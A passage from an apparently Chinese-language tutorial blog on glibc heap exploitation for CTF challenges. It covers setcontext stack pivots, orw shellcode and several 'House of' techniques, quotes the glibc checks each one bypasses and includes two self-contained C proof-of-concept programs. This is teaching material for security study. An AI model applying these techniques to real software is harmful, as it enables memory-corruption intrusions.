而不是 rbp 导致无法栈迁移实现对程序执行流程的连续劫持。</p>
<p>利用这个gadget，通过<code>rdi</code>控制<code>rbp</code>进而控制<code>rax</code>并执行跳转,只需要在<code>rax + 0x28</code>的位置设置<code>leave; ret</code>即可完成栈迁移.
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/b7b00a8ba06c0bda2d24ff50335ff3fa.png"
                     
alt="在这里插入图片描述" 
                > # orw shellcode
对于开了沙箱保护的堆题，由于不能 execve ，需要 orw 的手段来获取 flag 。
以这个<a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/pwn_6d42155be48dfe127bf2d8d9ae68f74a" >题目 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>为例，首先在泄露
libc 基地址后通过 house of storm 在 __free_hook
处申请堆块并写入如下数据： <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/9f1c3255e77af29d785836b66522068b.png"
                     
alt="在这里插入图片描述" 
                ></p>
<p>之后释放一个 SigreturnFrame，寄存器设置如下图所示。程序通过
setcontext gadget
设置寄存器后将完成栈迁移可程序执行流劫持后程序将执行，此时会调用
mprotect 函数将 __free_hook 所在内存页添加可执行属性并且会将栈迁移至
&amp;__free_hook+0x8 的位置。执行完 mprotect 函数后程序将跳转至
shellcode1 执行。shellcode 会向 __free_hook 所在内存页起始位置读入能 orw
的 shellcode2 并跳转至 shellcode 执行获取 flag 。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/d5e7e35deee043c07f38328a13e2124b.png"
                     
alt="在这里插入图片描述" 
                > # 与 ROP 结合 除了写 各种 hook
外，堆利用还可以与 ROP 结合。比如开沙箱禁用 execve
调用的堆题除了前面提到的 orw shellcode 方法外也可以用 orw 的 ROP 来获取
flag。 ## 在栈上构造 ROP __environ
是一个保存了栈上变量地址的系统变量，位于 libc 中。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/a16b5ee115e914b5a90fa3c496618017.png"
                     
alt="在这里插入图片描述" 
                > 先利用 tcache attack 攻击
<code>__environ</code> 泄露栈地址，然后再利用 tcache
攻击栈上函数的返回地址处，写入 ROP 最后在函数返回控制函数执行流程。 ##
栈迁移至堆 与 orw shellcode 思路类似，只不过这里只是通过 setcontext rop
将栈迁移至写有 rop 的堆中，利用 rop 来控制程序执行流程。</p>
<h1 id="house-of-roman">House of Roman</h1>
<p>通过覆盖 unsorted bin 的 fd 的低 2 字节对 glibc 上某结构进行 1/16
概率的爆破。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/69a156f8e0f8b352ec0befa078045689.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                ></p>
<h1 id="house-of-einherjar">House Of Einherjar</h1>
<p>House Of Einherjar 主要是利用释放不在 fast bin 大小范围内的 chunk
是会尝试合并前面已释放 chunk 的机制，通过伪造 chunk
头部实现几乎任意地址内存的申请。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/65dd6e231305c31cc6b3f9daa1da18fc.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                ></p>
<ul>
<li><p>构造 fake chunk ，因为 fake chunk 涉及 unlink ，</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">prev_inuse</span>(p)) &#123;</span><br><span class="line">    prevsize = <span class="built_in">prev_size</span>(p);</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = <span class="built_in">chunk_at_offset</span>(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">    <span class="built_in">unlink</span>(av, p, bck, fwd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>因此要绕过 unlink 的一系列检查（当然如果 fake chunk 用一个已经释放的
chunk 也是可以的）：</p>
<ol type="1">
<li><p>为了绕过</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect(FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                 </span><br><span class="line">    <span class="built_in">malloc_printerr</span>(check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);</span><br></pre></td></tr></table></figure></div>
<p>令：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">fake_chunk-&gt;fd = &amp;fake_chunk</span><br><span class="line">fake_chunk-&gt;bk = &amp;fake_chunk</span><br></pre></td></tr></table></figure></div></li>
<li><p>为了绕过（glibc-2.26 起）</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect(<span class="built_in">chunksize</span>(P) != <span class="built_in">prev_size</span>(<span class="built_in">next_chunk</span>(P)), <span class="number">0</span>))   </span><br><span class="line">    <span class="built_in">malloc_printerr</span>(<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);  </span><br></pre></td></tr></table></figure></div>
<p>令：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">fake_prev_size1 = fake_size</span><br></pre></td></tr></table></figure></div></li>
</ol></li>
<li><p>溢出修改 chunk2 的 <code>prev_size</code> 为
<code>&amp;chunk2 - &amp;fake_chunk</code> 并将 <code>PREV_INUSE</code>
置 0</p></li>
<li><p>free chunk2 ，触发 House Of Einherjar 。</p></li>
</ul>
<p>自 glibc-2.29 起加入了 prevsize 的检查，house of einherjar 必须确保
fake chunk 的 fake_size 等于 chunk2 的 fake_prev_size2。
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">  prevsize = prev_size (p);</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">  unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></p>
<h1 id="house-of-force">House Of Force</h1>
<p>篡改 top chunk 的 size 为一个很大值（通常为 0xFFFFFFFF
）可以绕过对用户请求的大小和 top chunk 现有的 size 进行的验证：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取当前的top chunk，并计算其对应的大小</span></span><br><span class="line">victim = av-&gt;top;</span><br><span class="line">size   = <span class="built_in">chunksize</span>(victim);</span><br><span class="line"><span class="comment">// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE)) </span><br><span class="line">&#123;</span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder      = <span class="built_in">chunk_at_offset</span>(victim, nb);</span><br><span class="line">    av-&gt;top        = remainder;</span><br><span class="line">    <span class="built_in">set_head</span>(victim, nb | PREV_INUSE |</span><br><span class="line">            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    <span class="built_in">set_head</span>(remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">check_malloced_chunk</span>(av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = <span class="built_in">chunk2mem</span>(victim);</span><br><span class="line">    <span class="built_in">alloc_perturb</span>(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>如果用户请求的堆大小不受限制就可以使得 top chunk
指向我们期望的任何位置。 自 glibc2.29 起新增了对 top chunk size
的合法性检查，house of force 就此失效。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">victim = av-&gt;top;</span><br><span class="line">size = chunksize (victim);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): corrupted top size&quot;</span>);</span><br></pre></td></tr></table></figure></div> # House of Rabbit
house of rabbit 有两种攻击方式。</p>
<p>第一种攻击方式是利用 malloc_consolidate 时缺少对 fast bin 中 chunk 的
size 的检查，通过修改 fast bin 中的 chunk 的 size 造成 overlap chunk
,然后触发 malloc_consolidate 使 fastbin
清空，从而分配出重叠的堆块。感觉用处不大，既然能改 size 为什么不先改
size 再释放？</p>
<p>第二种攻击方式是利用 malloc_consolidate 将 fast bin 放入 unsotrted
bin 和从 unsorted bin 进 large bin 以及 large bin 切割 chunk 时对 size
检查不严格从而可以不用严格保证 size 正确的情况下将 fake chunk
申请出来，甚至可以任意地址 malloc 。</p>
<p>首先，要想任意地址 malloc 需要让伪造的 chunk 进入 large bin
的最后一个 bin 那么 size 字段至少为 0x80000 。然而 system_mem 初始默认为
0x21000，因此伪造的 chunk 从 unsorted bin 进入 large bin
时会通不过下面的检查： <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">    || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">  malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                   chunk2mem (victim), av);</span><br></pre></td></tr></table></figure></div> 因此需要想办法增大 system_mem
。</p>
<p>其中一种办法是通过申请和释放大内存增大 mmap_threshold 然后 sbrk 增大
system_mem 。</p>
<p>当申请一块大内存时如果 ptmalloc 找不到合适的内存会调用 sysmalloc
函数向系统获取内存。 就 main_arena 来说，当调用 sysmalloc 时，ptmalloc
获取内存有直接 mmap 和 brk 扩展 heap 区域两种方式。这两种方式的选择由
mmap_threshold 决定。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (av == <span class="literal">NULL</span></span><br><span class="line">    || ((<span class="type">unsigned</span> <span class="type">long</span>) (nb) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (mp_.mmap_threshold)</span><br><span class="line"> &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))</span><br></pre></td></tr></table></figure></div> 只有当所需内存小于 mmap_threshold
时才会调用 brk 扩展内存，system_mem 也才会增加。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (brk != (<span class="type">char</span> *) (MORECORE_FAILURE))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (mp_.sbrk_base == <span class="number">0</span>)</span><br><span class="line">      mp_.sbrk_base = brk;</span><br><span class="line">    av-&gt;system_mem += size;</span><br></pre></td></tr></table></figure></div>
因此需要先想办法增大 mmap_threshold 。</p>
<p>当释放一块 ptmalloc 通过 mmap 得到的内存时会将 mmap_threshold 与
chunk 的 size 取最值，因此可以首先通过申请和释放一块大内存将
mmap_threshold 增大。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (chunk_is_mmapped (p))                       <span class="comment">/* release mmapped memory. */</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* see if the dynamic brk/mmap threshold needs adjusting */</span></span><br><span class="line">    <span class="keyword">if</span> (!mp_.no_dyn_threshold</span><br><span class="line">        &amp;&amp; p-&gt;size &gt; mp_.mmap_threshold</span><br><span class="line">        &amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX)</span><br><span class="line">      &#123;</span><br><span class="line">        mp_.mmap_threshold = chunksize (p);</span><br><span class="line">        mp_.trim_threshold = <span class="number">2</span> * mp_.mmap_threshold;</span><br><span class="line">        LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="number">2</span>,</span><br><span class="line">                    mp_.mmap_threshold, mp_.trim_threshold);</span><br><span class="line">      &#125;</span><br><span class="line">    munmap_chunk (p);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>
<p>之后再次申请一块大内存来增大 system_mem 。</p>
<p>将 fast bin 中的 chunk 的 fd 指向 fake chunk。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/86470c1200bea0487af12792ac83b64e.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                >
将 fake chunk 的 size 置1，是为了避免 malloc_consolidate 时与后面的
chunk 合并时 unlink 出错。因为 size 为 1 时查找的下一个地址相邻的 chunk
是自身。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">   size = chunksize(p);</span><br><span class="line">   nextchunk = chunk_at_offset(p, size);</span><br><span class="line">   nextsize = chunksize(nextchunk);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">       prevsize = prev_size(p);</span><br><span class="line">       size += prevsize;</span><br><span class="line">       p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">       unlink(av, p, bck, fwd);	<span class="comment">// 不能执行到这里</span></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">  nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">    size += nextsize;</span><br><span class="line">    unlink(av, nextchunk, bck, fwd);	<span class="comment">// 不能执行到这里</span></span><br><span class="line">  &#125; <span class="keyword">else</span></span><br><span class="line">    clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br></pre></td></tr></table></figure></div>
<p>free 一个不在 fast bin 范围的 chunk 与 top chunk 合并，合并后大小大于
FASTBIN_CONSOLIDATION_THRESHOLD 即 0x10000 触发 malloc_consolidate，此时
fake chunk 进入 unsorted bin，而原本在 fast bin 中的 chunk 和释放的
chunk 都合并到 top chunk 中。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">   <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">     <span class="keyword">if</span> (have_fastchunks(av))</span><br><span class="line">malloc_consolidate(av);</span><br></pre></td></tr></table></figure></div>
<p>为了通过 unsorted bin 到 large bin 时对 size 的检查，同时确保 fake
chunk 进入 large bin 的最后一个 bin，需要将 size 的值改为 0x80000
以上。</p>
<p>申请一个大于 0x80000 的内存让 fake chunk 进入 large bin，之后修改
fake chunk 的 size
为一个很大的值（与目标地址的差值再加上一个合适的值，因为第一次 malloc
时会把剩余部分放入 unsorted bin，再次 malloc 会有对 size
的检查）。由于申请内存时从 large bin 的 chunk 切割 chunk 时对 size
缺少检验，因此可以像 house of force 一样任意地址 malloc 。</p>
<p><a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/house_of_poc/house_of_rabbit" >poc <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>
如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> gbuf[<span class="number">6</span>] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">void</span> *fast, *small;</span><br><span class="line">	<span class="type">char</span> *victim, target[<span class="number">0x20</span>];</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">free</span>(<span class="built_in">malloc</span>(<span class="number">0x80000</span>));</span><br><span class="line"></span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x80000</span>);</span><br><span class="line"></span><br><span class="line">	fast = <span class="built_in">malloc</span>(<span class="number">0x10</span>); 		</span><br><span class="line">	small = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(fast);</span><br><span class="line"></span><br><span class="line">	gbuf[<span class="number">3</span>] = <span class="number">0x1</span>;	</span><br><span class="line"></span><br><span class="line">	*(<span class="type">unsigned</span> <span class="type">long</span>**)fast = &amp;gbuf[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(small);</span><br><span class="line"></span><br><span class="line">	gbuf[<span class="number">3</span>] = <span class="number">0x80001</span>;</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x80000</span>);</span><br><span class="line"></span><br><span class="line">	gbuf[<span class="number">3</span>] = (<span class="type">void</span>*)&amp;target-(<span class="type">void</span>*)(gbuf+<span class="number">2</span>)<span class="number">-0x20</span>+<span class="number">0x30</span>;	</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">malloc</span>((<span class="type">void</span>*)&amp;target-(<span class="type">void</span>*)(gbuf+<span class="number">2</span>)<span class="number">-0x20</span>);</span><br><span class="line">	victim = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	</span><br><span class="line">	assert(victim == &amp;target);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,victim);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>glibc-2.26 起，unlink 加入了对 next chunk 的 prev_size 的检查。
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \</span></span><br><span class="line"><span class="meta">      malloc_printerr (check_action, <span class="string">&quot;corrupted size vs. prev_size&quot;</span>, P, AV);  \</span></span><br></pre></td></tr></table></figure></div> 而从 large bin 中取出 chunk 时用的是 unlink
。虽然可以通过设置 size 大小使 next chunk 的 prev_size
在可控内存上，但是很有可能会造成之后从 unsorted bin 中取 chunk 时 size
通不过检查，这无疑增加了利用难度。</p>
<p>glibc-2.27 起，malloc_consolidate 加入了对 fast bin 中 chunk 的 size
的检查。至此，house of rabbit 攻击效果与 fast bin attack 相当，<del>不如
tcache attack</del> 。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((&amp;fastbin (av, idx)) != fb)</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc_consolidate(): invalid chunk size&quot;</span>);</span><br></pre></td></tr></table></figure></div> # House of Mind 对于非 main_arena
管理的堆是在 mmap 出的一块 heap_info 结构的内存区域中分配内存的。house
of mind 正是通过伪造 arena 和 heap info 实现在伪造的 arena 上写一个
chunk 的地址。这里以 fast bin 范围的 chunk 举例。</p>
<p>当释放的 chunk 的 NON_MAIN_ARENA 标志位置 1 则 ptmalloc 认为该 chunk
不属于 main_arena 管理，因此通过先寻找其对应的 heap_info ，然后通过
heap_info 的 ar_ptr 查找 chunk 对应的 arena 。</p>
<p>根据 chunk 寻找 arena 的过程具体实现如下，其中 HEAP_MAX_SIZE 为
0x4000000 。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> heap_for_ptr(ptr) \</span></span><br><span class="line"><span class="meta">  ((heap_info *) ((unsigned long) (ptr) &amp; ~(HEAP_MAX_SIZE - 1)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> arena_for_chunk(ptr) \</span></span><br><span class="line"><span class="meta">  (chunk_non_main_arena (ptr) ? heap_for_ptr (ptr)-&gt;ar_ptr : &amp;main_arena)</span></span><br></pre></td></tr></table></figure></div> 因此可以考虑伪造 heap_info 和 arena 将一个在
fake heap_info 范围内的 chunk 的 NON_MAIN_ARENA 标志位置 1 然后释放该
chunk ，从而在伪造的 arena 上写该 chunk 的地址 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/5183f883b1249e6b01b8072f7e377a22.png"
                     
alt="在这里插入图片描述" 
                ></p>
<p>其中 system_mem 置为 inf 是为了绕过如下检查：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">   <span class="keyword">if</span> (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">|| __builtin_expect (chunksize (chunk_at_offset (p, size))</span><br><span class="line">		     &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">     &#123;</span><br><span class="line"><span class="comment">/* We might not have a lock at this point and concurrent modifications</span></span><br><span class="line"><span class="comment">   of system_mem might have let to a false positive.  Redo the test</span></span><br><span class="line"><span class="comment">   after getting the lock.  */</span></span><br><span class="line"><span class="keyword">if</span> (have_lock</span><br><span class="line">    || (&#123; assert (locked == <span class="number">0</span>);</span><br><span class="line">	  mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">	  locked = <span class="number">1</span>;</span><br><span class="line">	  chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ</span><br><span class="line">	    || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem;</span><br><span class="line">      &#125;))</span><br><span class="line">  &#123;</span><br><span class="line">    errstr = <span class="string">&quot;free(): invalid next size (fast)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">if</span> (! have_lock)</span><br><span class="line">  &#123;</span><br><span class="line">    (<span class="type">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">    locked = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure></div>
<p><a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/house_of_poc/house_of_mind" >poc <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>
如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;	</span><br><span class="line">	<span class="type">int</span> HEAP_MAX_SIZE = <span class="number">0x4000000</span>;</span><br><span class="line">	<span class="type">int</span> MAX_SIZE = (<span class="number">128</span> * <span class="number">1024</span>) - <span class="number">0x100</span>;</span><br><span class="line">    </span><br><span class="line">	<span class="type">uint8_t</span> * fake_arena = <span class="built_in">malloc</span>(<span class="number">0x1000</span>); </span><br><span class="line">	<span class="type">uint8_t</span> * target_loc = fake_arena + <span class="number">0x28</span>;</span><br><span class="line">	<span class="type">uint8_t</span> * target_chunk = (<span class="type">uint8_t</span> *) fake_arena - <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">	fake_arena[<span class="number">0x880</span>] = <span class="number">0xff</span>;</span><br><span class="line">	fake_arena[<span class="number">0x881</span>] = <span class="number">0xff</span>; </span><br><span class="line">	fake_arena[<span class="number">0x882</span>] = <span class="number">0xff</span>; </span><br><span class="line">	fake_arena[<span class="number">0x883</span>] = <span class="number">0xff</span>;</span><br><span class="line"></span><br><span class="line">	<span class="type">uint64_t</span> new_arena_value = (((<span class="type">uint64_t</span>)target_chunk) + HEAP_MAX_SIZE) &amp; ~(HEAP_MAX_SIZE - <span class="number">1</span>);</span><br><span class="line">	<span class="type">uint64_t</span> * fake_heap_info = (<span class="type">uint64_t</span> *)new_arena_value;</span><br><span class="line"></span><br><span class="line">	<span class="type">uint64_t</span> * user_mem = <span class="built_in">malloc</span>(MAX_SIZE);</span><br><span class="line">	<span class="keyword">while</span>((<span class="type">long</span> <span class="type">long</span>)user_mem &lt; new_arena_value)&#123;</span><br><span class="line">        <span class="comment">// 使heap_for_ptr(victim)落在fake_heap_info上</span></span><br><span class="line">		user_mem = <span class="built_in">malloc</span>(MAX_SIZE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="type">uint64_t</span> * fastbin_chunk = <span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">	<span class="type">uint64_t</span> * chunk_ptr = fastbin_chunk - <span class="number">2</span>;</span><br><span class="line">    </span><br><span class="line">	fake_heap_info[<span class="number">0</span>] = (<span class="type">uint64_t</span>) fake_arena; <span class="comment">// Setting the fake ar_ptr (arena)</span></span><br><span class="line">	chunk_ptr[<span class="number">1</span>] = <span class="number">0x60</span> | <span class="number">0x4</span>; <span class="comment">// Setting the non-main arena bit</span></span><br><span class="line">	<span class="built_in">free</span>(fastbin_chunk); <span class="comment">// Trigger the madness</span></span><br><span class="line"></span><br><span class="line">	assert(*((<span class="type">unsigned</span> <span class="type">long</span> *)(target_loc)) != <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h1 id="house-of-corrosion">House of Corrosion</h1>
<p>house of Corrosion 是利用 malloc 和 free 过程中对 fastbinsY
数组边界检查不严格，通过修改 global_max_fast 为一个很大的值，造成
fastbinsY 数组越界，最终导致任意地址写的一种堆利用手法。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/1366514a21b40e8a1327dcbe885c759e.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                ></p>
<p>如果存在 UAF 漏洞的，那么可以通过修改 chunk 的 fd 再将 chunk
申请出来的的方式在 target 上写一个任意值。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/ea966ded7fa7ef248e758e930156c49b.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                >
更进一步，可以将任意地址的值写到其它任意地址上。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/503845dadb6d5e57394e202fffe3b1c5.png"
                      alt="在这里插入图片描述" style="zoom: 33%;" 
                >
glibc-2.27 起增加了对 global_max_fast
的检测，但实际分析汇编发现检测被优化掉了。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">get_max_fast(<span class="type">void</span>) &#123;</span><br><span class="line">    <span class="comment">/* Tell the GCC optimizers that global_max_fast is never larger</span></span><br><span class="line"><span class="comment">       than MAX_FAST_SIZE.  This avoids out-of-bounds array accesses in</span></span><br><span class="line"><span class="comment">       _int_malloc after constant propagation of the size parameter.</span></span><br><span class="line"><span class="comment">       (The code never executes because malloc preserves the</span></span><br><span class="line"><span class="comment">       global_max_fast invariant, but the optimizers may not recognize</span></span><br><span class="line"><span class="comment">       this.)  */</span></span><br><span class="line">    <span class="keyword">if</span> (global_max_fast &gt; MAX_FAST_SIZE)</span><br><span class="line">        __builtin_unreachable();</span><br><span class="line">    <span class="keyword">return</span> global_max_fast;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/3eadb9da0e6eaac17723bb9902834bc4.png"
                     
alt="在这里插入图片描述" 
                > 在 glibc-2.37 版本中，global_max_fast
的数据类型被修改为了 int8_u，进而导致可控的空间范围大幅度缩小。 # House
of Lore 以 how2heap 为例：</p>
<ol type="1">
<li><p>首先申请大小在 small bin 范围的 chunk 。</p></li>
<li><p>申请一个 chunk 防止 free chunk1 时与 top chunk 合并。</p></li>
<li><p>释放 chunk 进入 unsort bin 。</p></li>
<li><p>申请一个 更大的内存使 chunk1 进入 small bin ，此时状态如下图：
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/9015a5827307435b3e85d2085a890da4.png"
                      alt="在这里插入图片描述" style="zoom:25%;" 
                ></p></li>
<li><p>如下图形式，绕过检查：</p>
